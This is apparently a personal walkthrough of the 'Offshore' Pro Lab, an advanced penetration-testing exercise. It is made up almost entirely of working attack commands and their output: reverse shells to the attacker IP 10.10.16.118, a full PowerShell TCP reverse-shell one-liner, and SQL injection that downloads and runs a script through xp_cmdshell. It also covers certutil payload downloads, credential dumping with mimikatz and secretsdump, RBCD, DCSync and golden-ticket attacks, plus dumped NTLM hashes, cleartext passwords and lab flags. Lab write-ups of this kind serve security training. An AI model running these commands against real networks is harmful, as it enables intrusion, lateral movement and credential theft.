# Offshore

<figure><img src="../../../../.gitbook/assets/ic-offshore-overview.svg" alt=""><figcaption></figcaption></figure>

## Summary

* **Machines** - 21
* **Flags** - 38
* **Difficulty** - Advanced
* **Penetration Tester** - Level 3
* **Entry Point** - 10.10.110.0/24

## Entry Points

```bash
# Reachable Hosts & Ports
10.10.110.3
PORT    STATE SERVICE  REASON  VERSION
443/tcp open  ssl/http syn-ack nginx

10.10.110.123
PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     syn-ack Apache httpd 2.4.18 ((Ubuntu))
8000/tcp open  http     syn-ack Splunkd httpd
8089/tcp open  ssl/http syn-ack Splunkd httpd (free license; remote login disabled)

10.10.110.124
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 10.0
```

## Flags

```
NIX01 - Just gettin' started - OFFSHORE{b3h0ld_th3_P0w3r_0f_$plunk}
```

## NIX01 - 172.16.1.23

### User - Mark

<pre class="language-bash"><code class="lang-bash"><strong>use exploit/multi/http/splunk_upload_app_exec
</strong>set target 1
run
python3 -c 'import pty;pty.spawn("/bin/bash")'
</code></pre>

### Privilege Escalation #1 - postgres

```bash
# Login to postgresql
/usr/local/pgsql/bin/psql -U postgres
# Command Execution run meterpreter shell
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM '/dev/shm/shell.elf';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
# Flag
Wanna see some magic? - OFFSHORE{fun_w1th_m@g1k_bl0ck$}
```

### Privilege Escalastion #2 - root

```bash
# Read root private ssh key and save to id_rsa
sudo /usr/bin/tail -n 999 /root/.ssh/id_rsa
# Change id_rsa permissions
chmod 600 id_rsa
# Login as root
ssh root@$ip -i id_rsa
# Flag
I can see all things - OFFSHORE{st0p_tai1ing_m3_br0}
```

Post Enumeration

{% code overflow="wrap" %}
```bash
# Dump network traffic
tcpdump -i eth0 -w cap.pca
# Find Post request with password
HTTP/1.1 100 Continue

POST /apiclient/login.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.5066
Content-Type: application/x-www-form-urlencoded
Host: 172.16.1.23
Content-Length: 79
Expect: 100-continue
Connection: Keep-Alive

username=admin&flag=OFFSHORE%7Bl0v3_cl3artext_pr0toc0l%24%7D&password=Zaq12wsx!HTTP/1.1 404 Not Found
Date: Mon, 17 Apr 2023 09:53:56 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 273
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1
# Get another flag
Nothing to see here - OFFSHORE{l0v3_cl3artext_pr0toc0l$}
```
{% endcode %}

## Setup Pivot #1

```bash
# Setup Proxy
ssh -D 1080 root@$ip -fN -i id_rsa
# Confirm Proxy is running
lsof -i :1080
```

## MS01 - 172.16.1.30

{% code overflow="wrap" %}
```bash
# Run exploit
proxychains python3 47255.py -t http://172.16.1.30 -u admin -p 'Zaq12wsx!' -c 'powershell wget http://10.10.16.118/nc.exe -Outfile nc.exe'

proxychains python3 47255.py -t http://172.16.1.30 -u admin -p 'Zaq12wsx!' -c 'nc.exe -e cmd.exe 10.10.16.118 53'

# Get Flag
But I read it was secure - OFFSHORE{p@ssw0rds_1n_cl3ar_t3xT}
All powerful, all knowing - OFFSHORE{RC3_a$_@_s3rv1c3}
```
{% endcode %}

## Active Directory Enumeration #1

{% code overflow="wrap" %}
```bash
proxychains bloodhound-python -d ned.flanders_adm -u ned.flanders_adm -p 'Lefthandedyeah!' -dc dc01.corp.local -c DCOnly -ns 172.16.1.5 --dns-tcp 
```
{% endcode %}

## WSADM - 172.16.1.36

{% code overflow="wrap" %}
```bash
# Remote Desktop using found credentials
proxychains xfreerdp /u:ned.flanders_adm /p:'Lefthandedyeah!' /v:172.16.1.36 /d:corp.local
# Generate payload
sudo docker run -e LANG=C.UTF-8 --net=host -it charliedean07/winpayloads
1

sc.exe start WCAssistantService
# Add user for persistence
net user haxor P@ssw0rd /add
net localgroup administrators haxor /add
net localgroup "remote desktop users" haxor /add
# Connect as system

load kiwi
# Get Flag
type C:\Users\wsadmin\Desktop\flag.txt
OFFSHORE{4t_y0ur_5erv1ce}
```
{% endcode %}

## WS02 - 172.16.1.101

{% code overflow="wrap" %}
```bash
# Dump with DonPAPI
proxychains python3 DonPAPI.py -u CORP/wsadmin@172.16.1.101 -H :669b12a3bac275251170afbe2c5de8c2
# Flag
Memories, fond memories - OFFSHORE{mimikatz_d03s_th3_j0b}


proxychains /usr/share/doc/python3-impacket/examples/psexec.py wsadmin:'Workstationadmin1!'@172.16.1.101
# Post Exploitation
cd \Backups
findstr /spin 'password'
```
{% endcode %}

## SQL01 - 172.16.1.15

### User

{% code overflow="wrap" %}
```bash
# http://172.16.1.24/login with creds from 1.101
# svc_iis / Vintage!
# username: admin'-- password: admin

proxychains sqlmap -r req2.txt --batch --level 4 --risk 3 --dbms=mssql --dbs -p 'tem:author' --os-shell
```
{% endcode %}

### Privilege Escalation

{% code overflow="wrap" %}
```bash
# Upgrade shell
nc -lvnp 4444
# Create additional shell
nc -lvnp 4545
start /b nc64.exe -e cmd.exe 10.10.16.118 4545
# Download tools
cd \windows\tasks
net use x: \\10.10.16.118\visualstudio /user:kali @WSX2wsx
copy X:\OSEP\ActiveDirectoryExploitation\SpoolSample.exe
copy X:\OSEP\ActiveDirectoryExploitation\PrintSpoofer.exe
# Privesc
PrintSpoofer.exe \\.\pipe\test\pipe\spoolss "c:\temp\nc64.exe -e cmd.exe 10.10.16.118 4455"
SpoolSample.exe SQL01 SQL01/pipe/test
```
{% endcode %}

### Post Exploitation

{% code overflow="wrap" %}
```bash

# C:\Users\Public\Libraries\share.bat - Has credentials



DocumentsService.asmx?WSDL
sqlmap a request to getDocuments_Dev to find sqli on author field
might have to enable xp_cmdshell first, then
a'); exec xp_cmdshell "ping 172.16.1.23"--
a'); exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://yourip:8000/revshell.ps1')"--
rotten potato to get system - https://pentestlab.blog/tag/rotten-potato/
C:\Users\Public\Libraries has scripts to mount share as bill, creds to pgibbons, and flags
More data in mssql database https://www.sqlshack.com/recover-lost-sa-password/

# Flags
# Users love to take shortcuts - OFFSHORE{sl0ppy_scr1pting_hurt$}
# Never cease to amaze - OFFSHORE{cm0n!_an0th3r_sqli!?}
# I'll take fries with that - OFFSHORE{hmm_p0tato3s}
```
{% endcode %}

## SALVADOR

### Reset Password

{% code overflow="wrap" %}
```powershell
# Create credentials to auth as pgibbons
$SecPassword = ConvertTo-SecureString 'I l0ve going Fishing!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('CORP\pgibbons', $SecPassword)
# Set a new password variable
$UserPassword = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
# Set the new password
Set-DomainUserPassword -Identity SALVADOR -AccountPassword $UserPassword -Credential $Cred

```
{% endcode %}

### Add to Security Engineers group

{% code overflow="wrap" %}
```powershell
# Create a secure string
$SecPassword = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
# Create credential object
$Cred = New-Object System.Management.Automation.PSCredential('CORP.local\salvador', $SecPassword)
# Change the user password
Add-DomainGroupMember -Identity 'security engineers' -Members 'salvador' -Credential $Cred
```
{% endcode %}

## CYBER\_ADM

{% code overflow="wrap" %}
```powershell
$username = "Corp\salvador"
$password = ConvertTo-SecureString -Force -AsPlainText "P@ssw0rd"
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList($username,$password)
$accPW = ConvertTo-SecureString -force -AsPlainText "P@ssw0rd"
Set-DomainUserPassword -Identity cyber_adm -Domain corp.local -Credential $cred -Verbose -AccountPassword $accPW
```
{% endcode %}

## WEB-WIN01 - 172.16.1.24

```powershell
proxychains evil-winrm -i 172.16.1.24 -u cyber_adm -p 'P@ssw0rd'
type C:\Users\Administrator\Desktop\flag.txt

All the way back around - OFFSHORE{it_@ll_c0m3s_FuLl_c1rcl3}
```

## CORP.LOCAL Domain

{% code overflow="wrap" %}
```powershell
# Connected as cyber_adm on web-win
proxychains evil-winrm -i 172.16.1.24 -u cyber_adm -p 'P@ssw0rd'
cd /windows/tasks
upload /home/kali/share/PsExec64.exe
upload /home/kali/share/nc64.exe
.\PsExec64.exe -accepteula
.\PsExec64.exe -s -i C:\Windows\Tasks\nc64.exe -c cmd.exe 10.10.16.118 4444

Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity Cyber_Adm -Rights DCSync -Verbose


proxychains /usr/share/doc/python3-impacket/examples/secretsdump.py CORP.local/cyber_adm:'P@ssw0rd'@172.16.1.5 -dc-ip 172.16.1.5

# Flags
What's the worst that could happen? - OFFSHORE{r3pl1cation_@ll0w_l1st}
```
{% endcode %}

## FS01

{% code overflow="wrap" %}
```powershell
proxychains evil-winrm -i 172.16.1.26 -u administrator@CORP.local -H 0109d7e72fcfe404186c4079ba6cf79c

type C:\Users\Administrator\Desktop\flag.txt
# Flags
OFFSHORE{f1l3_s3rv3rs_h0ld_ju1cy_d@ta}
```
{% endcode %}

## Setup Pivot

```
run autoroute -s 172.16.2.0/24
use auxiliary/server/socks_proxy
set version 4a
set srvport 8888
run -j
```

## WS03 - 172.16.2.102

{% code overflow="wrap" %}
```bash
proxychains /usr/share/doc/python3-impacket/examples/psexec.py svc_devops@corp.local@172.16.2.102 -hashes :c718f548c75062ada93250db208d3178


type C:\Users\Administrator\Desktop\flag.txt

Headed down another path - OFFSHORE{ACL_@bus3_0ft3n_ov3rl00k3d}
```
{% endcode %}

## DEV\joe

{% code overflow="wrap" %}
```bash
# Get initial shell as joe on WS03
proxychains /usr/share/doc/python3-impacket/examples/wmiexec.py DEV/joe@172.16.2.102
```
{% endcode %}

## dev.ADMIN.OFFSHORE.COM

{% code overflow="wrap" %}
```bash
# RDP TO WS03 as Joe
proxychains xfreerdp /v:172.16.2.102 /u:joe /p:'' /cert:ignore /tls-seclevel:0 /timeout:500000
# Setup listener
nc -lvnp 4567
# Use PowerShell Reverse Shell
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.118',4567);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
# Download Tools
certutil.exe -f -urlcache http://10.10.16.118/nc64.exe nc64.exe
certutil.exe -f -urlcache http://10.10.16.118/Rubeus.exe Rubeus.exe
certutil.exe -f -urlcache http://10.10.16.118/Powermad.ps1 Powermad.ps1
certutil.exe -f -urlcache http://10.10.16.118/PowerView.ps1 PowerView.ps1
# RBCD
# Get PowerMad
certutil.exe -f -urlcache http://10.10.16.118/Powermad.ps1 Powermad.ps1
# Create new machine account
New-MachineAccount -MachineAccount sexytimes -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
# Get computer SID
$ComputerSid = Get-DomainComputer sexytimes -Properties objectsid | Select -Expand objectsid
# Generic ACE with the attacker-added computer SID
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
# Set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity
Get-DomainComputer DC02 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
# Use Rubeus to hash the plaintext password
.\Rubeus.exe hash /password:Summer2018!
EF266C6B963C0BB683941032008AD47F

Rubeus.exe s4u /user:sexytimes$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/DC02.dev.ADMIN.OFFSHORE /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt



# Flags
# Entrance to the big show - OFFSHORE{l@zy_adm1ns_ru1n_th3_p4rty}

certutil.exe -f -urlcache http://10.10.16.118/mimikatz.exe mimikatz.exe
certutil.exe -f -urlcache http://10.10.16.118/mimidrv.sys mimidrv.sys

Administrator:500:aad3b435b51404eeaad3b435b51404ee:c61f43b6a4db2676714713836b7d2ea6
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9404def404bc198fd9830a3483869e78
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
IIS_dev:1105:aad3b435b51404eeaad3b435b51404ee:ce18f9730484ed029749730e2f82b147
joe:1604:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
haxor:11102:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:45b3e3a715e08c417cb0756e50805536
WS03$:1104:aad3b435b51404eeaad3b435b51404ee:9c8796117bf0750805e6989f98fcc4fe
sexytimes$:11101:aad3b435b51404eeaad3b435b51404ee:ef266c6b963c0bb683941032008ad47f
ADMIN$:1103:aad3b435b51404eeaad3b435b51404ee:64884d219b38e8c64c1447ede42993a5
CORP$:1109:aad3b435b51404eeaad3b435b51404ee:87ef7825090a52d9e463f9a99bce2350


```
{% endcode %}

## ADMIN.OFFSHORE.COM

```
SourceName      : dev.ADMIN.OFFSHORE.COM
TargetName      : ADMIN.OFFSHORE.COM
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 5/31/2018 10:24:17 PM
WhenChanged     : 4/23/2023 6:46:42 AM
```

### Enumeration

```bash
# Get Users
Get-DomainUser -Domain admin.offshore.com | select samaccountname
Administrator 
Guest         
DefaultAccount
krbtgt        
bankvault 
# Get Computers
Get-DomainComputer -Domain admin.offshore.com | select dnshostname
DC03.ADMIN.OFFSHORE.COM
MS01.ADMIN.OFFSHORE.COM
WS04.ADMIN.OFFSHORE.COM

```

### Golden Ticket Attack with ExtraSIDS

{% code overflow="wrap" %}
```bash
# Get Account SIDs
wmic useraccount get name,sid
# Generate golden ticket
kerberos::golden /domain:dev.admin.offshore.com /user:Administrator /sid:S-1-5-21-1416445593-394318334-2645530166 /krbtgt:9404def404bc198fd9830a3483869e78 /sids:S-1-5-21-1216317506-3509444512-4230741538-519 /ptt
# DCSYNC
lsadump::dcsync /user:admin\krbtgt /domain:admin.offshore.com
certutil.exe -f -urlcache http://10.10.16.118/shell.exe shell.exe
certutil.exe -f -urlcache http://10.10.16.118/PsExec64.exe psexec.exe
net use x: \\dc03.admin.offshore.com\c$
psexec -accepteula \\dc03.admin.offshore.com\ cmd /c C:\shell.exe
```
{% endcode %}

Creds

{% code overflow="wrap" %}
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f2594c9e60abf7e28e7601db343a7e24
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ea9112d4beb759907688c9e267eff246
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
bankvault:3113:aad3b435b51404eeaad3b435b51404ee:0ce1cb01ade331cdba32d0e1fba338a1
DC03$:1000:aad3b435b51404eeaad3b435b51404ee:a309490aabcffeea561fb1d8b36607d0
MS01$:1107:aad3b435b51404eeaad3b435b51404ee:db505645b78f70ae01dd6cebbe4b2b8b
WS04$:1108:aad3b435b51404eeaad3b435b51404ee:2abf50d13b5e08b92ac2d90c1d125b99
DEV$:3101:aad3b435b51404eeaad3b435b51404ee:e29b7368d2806a99389e63a60cdd7917
CLIENT$:3104:aad3b435b51404eeaad3b435b51404ee:9d820dd829a4116f8cc7a157e5971072
```
{% endcode %}

Flags

```bash
# Again, and again, and again - OFFSHORE{w@tch_th0s3_3xtra_$ids}
```

Setup Pivot

```
run autoroute -s 172.16.3.0/24
```

## 172.16.3.103

{% code overflow="wrap" %}
```bash
# Connect with DA Hashes
proxychains /usr/share/doc/python3-impacket/examples/psexec.py administrator@ADMIN.OFFSHORE.COM@172.16.3.103 -hashes :f2594c9e60abf7e28e7601db343a7e24
# Collect flags
type C:\Users\Administrator\Desktop\flag.txt
OFFSHORE{w@tch_th3_for3st_burn}
```
{% endcode %}
